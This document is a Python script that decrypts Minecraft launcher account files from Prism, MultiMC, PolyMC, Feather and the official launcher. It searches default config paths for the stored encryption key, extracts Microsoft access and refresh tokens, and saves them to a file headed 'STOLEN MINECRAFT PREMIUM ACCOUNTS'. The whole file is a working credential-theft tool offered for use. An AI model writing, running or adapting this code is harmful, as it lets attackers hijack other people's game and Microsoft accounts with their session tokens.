#!/usr/bin/env python3
"""
Decrypt Prism Launcher accounts.json and extract refresh tokens
Usage: python3 decrypt-accounts.py <accounts.json> [prismlauncher.cfg]
"""

import json
import base64
import sys
import os
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("ERROR: cryptography library not installed")
    print("Install with: pip install cryptography")
    sys.exit(1)


def find_encryption_key(cfg_path=None):
    """Find encryption key from launcher config"""
    if cfg_path and os.path.exists(cfg_path):
        with open(cfg_path, 'r') as f:
            for line in f:
                if line.startswith('AccountsEncryptionKey='):
                    key = line.split('=', 1)[1].strip()
                    return key
    
    # Try default locations for different launchers
    default_paths = [
        # Prism Launcher
        Path.home() / '.local/share/PrismLauncher/prismlauncher.cfg',
        Path.home() / '.var/app/org.prismlauncher.PrismLauncher/data/PrismLauncher/prismlauncher.cfg',
        # MultiMC
        Path.home() / '.local/share/multimc/multimc.cfg',
        # PolyMC
        Path.home() / '.local/share/PolyMC/polymc.cfg',
    ]
    
    for path in default_paths:
        if path.exists():
            with open(path, 'r') as f:
                for line in f:
                    if line.startswith('AccountsEncryptionKey='):
                        key = line.split('=', 1)[1].strip()
                        return key
    
    return None


def decrypt_aes256(encrypted_base64, key_base64):
    """Decrypt AES-256-CBC encrypted data"""
    try:
        # Decode base64
        encrypted_data = base64.b64decode(encrypted_base64)
        key = base64.b64decode(key_base64)
        
        # Extract IV (first 16 bytes) and ciphertext
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        
        # Decrypt
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove PKCS7 padding
        padding_length = decrypted[-1]
        decrypted = decrypted[:-padding_length]
        
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        return None


def extract_tokens(accounts_json_path, encryption_key=None):
    """Extract and decrypt tokens from accounts.json"""
    
    # Load accounts.json
    try:
        with open(accounts_json_path, 'r') as f:
            data = json.load(f)
    except Exception as e:
        print(f"ERROR: Cannot read accounts.json: {e}")
        return []
    
    # Detect launcher type
    launcher_type = detect_launcher_type(data)
    print(f"[*] Detected launcher: {launcher_type}")
    
    if launcher_type == 'prism':
        return extract_prism_tokens(data, encryption_key)
    elif launcher_type == 'feather':
        return extract_feather_tokens(data)
    elif launcher_type == 'official':
        return extract_official_tokens(data)
    else:
        print("ERROR: Unknown launcher format")
        return []


def detect_launcher_type(data):
    """Detect which launcher the accounts.json is from"""
    if 'formatVersion' in data and data.get('formatVersion') == 3:
        return 'prism'  # Prism/MultiMC/PolyMC
    elif 'accounts' in data and isinstance(data['accounts'], dict):
        # Check if it's Feather or Official
        for acc_id, acc_data in data['accounts'].items():
            if 'type' in acc_data and acc_data['type'] == 'microsoft':
                return 'feather'
            elif 'accessToken' in acc_data:
                return 'official'
    return 'unknown'


def extract_feather_tokens(data):
    """Extract tokens from Feather Client accounts.json"""
    print("[*] Extracting Feather Client accounts...")
    results = []
    
    accounts = data.get('accounts', {})
    
    for acc_id, account in accounts.items():
        username = account.get('username', 'Unknown')
        uuid = account.get('uuid', 'Unknown')
        account_type = account.get('type', 'Unknown')
        
        print(f"\n[*] Processing account: {username} ({uuid})")
        print(f"    Type: {account_type}")
        
        if account_type == 'microsoft':
            # Feather stores tokens in plain text!
            access_token = account.get('accessToken')
            refresh_token = account.get('refreshToken')
            
            if access_token:
                print(f"    [+] Access Token: {access_token[:50]}...")
            
            if refresh_token:
                print(f"    [+] Refresh Token: {refresh_token[:50]}...")
            
            results.append({
                'username': username,
                'uuid': uuid,
                'type': account_type,
                'access_token': access_token,
                'refresh_token': refresh_token,
                'xuid': account.get('xuid'),
                'client_token': None
            })
        else:
            print(f"    [!] Offline/cracked account - no tokens")
    
    return results


def extract_official_tokens(data):
    """Extract tokens from Official Minecraft Launcher"""
    print("[*] Extracting Official Launcher accounts...")
    results = []
    
    accounts = data.get('accounts', {})
    
    for acc_id, account in accounts.items():
        username = account.get('username', 'Unknown')
        uuid = account.get('uuid', 'Unknown')
        
        print(f"\n[*] Processing account: {username} ({uuid})")
        
        # Official launcher also stores in plain text
        access_token = account.get('accessToken')
        
        if access_token:
            print(f"    [+] Access Token: {access_token[:50]}...")
            
            results.append({
                'username': username,
                'uuid': uuid,
                'type': 'microsoft',
                'access_token': access_token,
                'refresh_token': None,  # Official launcher doesn't store refresh token
                'xuid': None,
                'client_token': None
            })
        else:
            print(f"    [!] No access token found")
    
    return results


def extract_prism_tokens(data, encryption_key=None):
    """Extract and decrypt tokens from Prism/MultiMC/PolyMC"""
    print("[*] Extracting Prism/MultiMC/PolyMC accounts...")
    
    # Get encryption key
    if not encryption_key:
        encryption_key = find_encryption_key()
    
    if not encryption_key:
        print("ERROR: Cannot find encryption key!")
        print("Please provide launcher config file or specify key manually")
        return []
    
    print(f"[+] Found encryption key: {encryption_key[:20]}...")
    
    # Extract accounts
    accounts = data.get('accounts', [])
    results = []
    
    for account in accounts:
        profile = account.get('profile', {})
        username = profile.get('name', 'Unknown')
        uuid = profile.get('id', 'Unknown')
        account_type = account.get('type', 'Unknown')
        
        print(f"\n[*] Processing account: {username} ({uuid})")
        print(f"    Type: {account_type}")
        
        if account_type == 'MSA':  # Microsoft account
            # Extract encrypted data
            yggdrasil = account.get('ygg', {})
            
            # Access token (encrypted)
            access_token_encrypted = yggdrasil.get('token', '')
            if access_token_encrypted:
                access_token = decrypt_aes256(access_token_encrypted, encryption_key)
                if access_token:
                    print(f"    [+] Access Token: {access_token[:50]}...")
                else:
                    print(f"    [-] Failed to decrypt access token")
                    access_token = None
            else:
                access_token = None
            
            # Extra data (contains refresh token)
            extra_encrypted = yggdrasil.get('extra', '')
            refresh_token = None
            
            if extra_encrypted:
                extra_json = decrypt_aes256(extra_encrypted, encryption_key)
                if extra_json:
                    try:
                        extra_data = json.loads(extra_json)
                        refresh_token = extra_data.get('refresh_token')
                        xuid = extra_data.get('xuid')
                        client_token = extra_data.get('clientToken')
                        
                        if refresh_token:
                            print(f"    [+] Refresh Token: {refresh_token[:50]}...")
                        if xuid:
                            print(f"    [+] XUID: {xuid}")
                        if client_token:
                            print(f"    [+] Client Token: {client_token[:30]}...")
                        
                        results.append({
                            'username': username,
                            'uuid': uuid,
                            'type': account_type,
                            'access_token': access_token,
                            'refresh_token': refresh_token,
                            'xuid': xuid,
                            'client_token': client_token
                        })
                    except json.JSONDecodeError:
                        print(f"    [-] Failed to parse extra data")
                else:
                    print(f"    [-] Failed to decrypt extra data")
        else:
            print(f"    [!] Offline/cracked account - no tokens")
    
    return results


def save_results(results, output_file='stolen_tokens.txt'):
    """Save extracted tokens to file"""
    with open(output_file, 'w') as f:
        f.write("=" * 80 + "\n")
        f.write("STOLEN MINECRAFT PREMIUM ACCOUNTS\n")
        f.write("=" * 80 + "\n\n")
        
        for acc in results:
            f.write(f"Username: {acc['username']}\n")
            f.write(f"UUID: {acc['uuid']}\n")
            f.write(f"Type: {acc['type']}\n")
            
            if acc.get('access_token'):
                f.write(f"Access Token: {acc['access_token']}\n")
            
            if acc.get('refresh_token'):
                f.write(f"Refresh Token: {acc['refresh_token']}\n")
            
            if acc.get('xuid'):
                f.write(f"XUID: {acc['xuid']}\n")
            
            if acc.get('client_token'):
                f.write(f"Client Token: {acc['client_token']}\n")
            
            f.write("\n" + "-" * 80 + "\n\n")
    
    print(f"\n[+] Results saved to: {output_file}")


def main():
    if len(sys.argv) < 2:
        print("Decrypt accounts.json from Minecraft launchers and extract tokens")
        print("\nSupported launchers:")
        print("  • Prism Launcher (encrypted)")
        print("  • MultiMC (encrypted)")
        print("  • PolyMC (encrypted)")
        print("  • Feather Client (plain text)")
        print("  • Official Minecraft Launcher (plain text)")
        print("\nUsage: python3 decrypt-accounts.py <accounts.json> [launcher.cfg]")
        print("\nExamples:")
        print("  python3 decrypt-accounts.py accounts.json")
        print("  python3 decrypt-accounts.py accounts.json prismlauncher.cfg")
        print("  python3 decrypt-accounts.py feather_accounts.json")
        sys.exit(1)
    
    accounts_json = sys.argv[1]
    cfg_file = sys.argv[2] if len(sys.argv) > 2 else None
    
    if not os.path.exists(accounts_json):
        print(f"ERROR: File not found: {accounts_json}")
        sys.exit(1)
    
    print("[*] Starting decryption...")
    print(f"[*] Accounts file: {accounts_json}")
    
    # Find encryption key (only needed for Prism/MultiMC)
    encryption_key = None
    if cfg_file:
        print(f"[*] Config file: {cfg_file}")
        encryption_key = find_encryption_key(cfg_file)
    else:
        print("[*] Searching for encryption key...")
        encryption_key = find_encryption_key()
    
    # Extract tokens
    results = extract_tokens(accounts_json, encryption_key)
    
    if results:
        print(f"\n[+] Successfully extracted {len(results)} account(s)!")
        save_results(results)
        
        # Print summary
        print("\n" + "=" * 80)
        print("SUMMARY:")
        for acc in results:
            print(f"  • {acc['username']} - Refresh Token: {'YES' if acc.get('refresh_token') else 'NO'}")
        print("=" * 80)
    else:
        print("\n[-] No accounts extracted")


if __name__ == '__main__':
    main()
